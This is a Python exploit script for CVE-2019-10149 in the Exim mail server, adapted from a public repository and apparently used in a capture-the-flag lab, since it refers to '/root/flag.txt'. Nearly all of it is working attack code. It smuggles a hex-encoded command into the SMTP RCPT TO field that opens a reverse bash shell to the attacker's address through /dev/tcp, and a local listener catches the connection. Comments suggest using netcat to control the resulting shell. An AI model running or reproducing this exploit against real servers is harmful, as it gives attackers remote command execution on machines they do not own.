# Reference: This code is adapted from github,
# available at: https://github.com/Diefunction/CVE-2019-10149/tree/master

import socket
import time
import threading


EXIT_FLAG = False
LISTENING_PORT = 12345
MAX_LISTENING_TIME = 20  # seconds

EXPLOIT_CMD = "cat /root/flag.txt"

ULT_CMD = "bash -i"  # this will create a bash for the attacker to execute arbitrary commands
                     # if use this command, it'd better to listen the port in the terminal 
                     # (i.e. nc -lvp $LISTENING_PORT) instead of the python program 
                     # in order to execute commands more conveniently


def convert_to_payload(cmd: str): 
    encoded_string = ""
    for char in cmd:
        if char.isprintable() and char not in ['\\', '"', ' ', '/', '&', '>', '<', '{', '}']:
            encoded_string += char
        else:
            encoded_string += f"\\x{ord(char):02X}"
    return encoded_string

def listen_port():
    global EXIT_FLAG
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("0.0.0.0", LISTENING_PORT))
        s.listen()
        print(f"Listening on port {LISTENING_PORT}...")
        while not EXIT_FLAG:
            conn, addr = s.accept()
            with conn:
                print(f"Connected by {addr}")
                data = conn.recv(1024)
                if data:
                    message = data.decode()
                    print(f"Received exploited data: {message}")
                    EXIT_FLAG = True
                    break


class Args(object):
    def __init__(self):
        import argparse
        self.parser = argparse.ArgumentParser()

    def parser_error(self, errmsg):
        print("Usage: python " + argv[0] + " use -h for help")
        exit("Error: {}".format(errmsg))

    def parse_args(self):
        self.parser._optionals.title = "OPTIONS"
        self.parser.add_argument('--rhost', help = "Target Host", required = True)
        self.parser.add_argument('--rport', help = "Target Port", default = 25, type = int)
        self.parser.add_argument('--lhost', help = 'Local IPv4', required = True)
        self.parser.add_argument('--lport', help = 'Local Port', type = int, required = True)
        return self.parser.parse_args()

class Exploit(object):
    def __init__(self, rhost, rport, lhost, lport):
        self._rhost = rhost
        self._rport = rport
        self._lhost = lhost
        self._lport = lport
        # composed_cmd = f'/bin/bash -c "{ULT_CMD} >& /dev/tcp/{lhost}/{lport} 0>&1"'
        # self._payload = convert_to_payload(composed_cmd)
        self._payload = '\\x2Fbin\\x2Fbash\\x20-c\\x20\\x22bash\\x20-i\\x20\\x3E\\x26\\x20\\x2Fdev\\x2Ftcp\\x2F{0}\\x2F{1}\\x200\\x3E\\x261\\x22'.format(lhost.replace('.', '\\x2E'), lport)
        self._run()
        
    def _ehlo(self):
        return 'EHLO {0}\r\n'.format(self._rhost)
    
    def _from(self):
        return 'MAIL FROM:<>\r\n'
    
    def _to(self):
        return 'RCPT TO:<${{run{{{0}}}}}@{1}>\r\n'.format(self._payload, self._rhost)
    
    def _data(self):
        return 'DATA\r\n'

    def _body(self):
        body = ''
        for i in range(1, 32):
            body = body + 'Received: {0}\r\n'.format(i)
        return body + '.\r\n'
    
    def _run(self):
        global EXIT_FLAG
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self._rhost, self._rport))
        sock.recv(1024)
        sock.send(self._ehlo().encode())
        sock.recv(1024)
        sock.send(self._from().encode())
        sock.recv(1024)
        sock.send(self._to().encode())
        sock.recv(1024)
        sock.send(self._data().encode())
        sock.recv(1024)
        sock.send(self._body().encode())
        sock.recv(1024)
        
        print("successfully send msg to the target")

        if_timeout = False
        st = time.time()
        while not EXIT_FLAG:
            if time.time() - st >= MAX_LISTENING_TIME:
                if_timeout = True
                EXIT_FLAG = True
        time.sleep(2)
        if if_timeout:
            print(f"[x] Exploit failed, didn't receive the msg from the target machine after {MAX_LISTENING_TIME}s")
        else:
            print(f'[+] Exploited. Received the response from the target machine for command:\n - {EXPLOIT_CMD}')

if __name__ == '__main__':
    args = Args().parse_args()
    LISTENING_PORT = args.lport
    
    # start a threading to listen to the response from the target
    listener_thread = threading.Thread(target=listen_port, daemon=True)
    listener_thread.start()
    
    Exploit(rhost = args.rhost, rport = args.rport, lhost = args.lhost, lport = args.lport)

# python3 exploit.py --rhost 192.168.56.3 --rport 25 --lhost 192.168.56.3 --lport 9000